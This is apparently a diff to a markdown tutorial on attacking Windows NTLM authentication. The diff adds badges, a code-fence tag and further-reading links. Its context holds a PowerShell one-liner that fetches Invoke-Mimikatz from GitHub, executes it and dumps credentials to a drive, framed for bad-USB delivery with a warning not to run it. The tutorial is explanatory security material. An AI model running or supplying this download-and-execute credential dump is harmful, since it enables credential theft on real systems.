@@ -1,3 +1,8 @@
+<p>
+  <a href="https://www.microsoft.com/en-us/windows/"><img alt="Windows" src="https://github.com/a4004/a4004/raw/main/www/svg/w10.svg"/></a> 
+  <a href="https://kali.org/"><img alt="Hyper-V" height="36" src="https://github.com/a4004/a4004/raw/main/www/svg/kali.png"/></a> 
+</p>
+
 # Pre-reading 🔍📚
 NTLM, otherwise known as the NT (New Technology) LAN Manager is a system of Microsoft security protocols used to provide various services within a Windows network. It is used to facilitate the following aspects:
 - Authentication
@@ -115,7 +120,7 @@ Arguably, the network-based attacks are more exciting because you can do it with
 One can achieve this by dumping the NTLM hashes using Mimikatz - a popular utility for exploiting Windows. You can use a bad USB in order to do this. Please be aware that Mimikatz is a known tool and is detected by most anti-virus companies, for our demo we had to disable Windows Defender.
 
 Here's an example script that could be typed into a run-box and then executed as administrator with the key-combination of `CTRL` + `SHIFT` + `ENTER`:
-```
+```pwsh
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds | Out-File "E:\hashes-dump.txt"
 ```
 :rotating_light: Do not run this script on your machine! It is bad practice to run random PowerShell scripts which you do did not create yourself or audit. :rotating_light: 
@@ -159,3 +164,8 @@ At this stage they can infect the DC with malware because as far as security is 
 And that's local NTLM for ya! 
 
 Now it's important to remember that there are so many ways to breach an organisation's network. These 2 methods aren't the only ones and they're not actually that different from each other. In a real world scenario you'd probably see a combination of the two being used (if the network is vulnerable to this).
+
+## Further reading: 📚
+- https://www.thehacker.recipes/ad/movement/ntlm
+- https://book.hacktricks.xyz/windows-hardening/ntlm
+- https://medium.com/cyber-security-resources/hacking-and-cracking-ntlm-hash-to-get-windows-admin-password-f44819b01db5
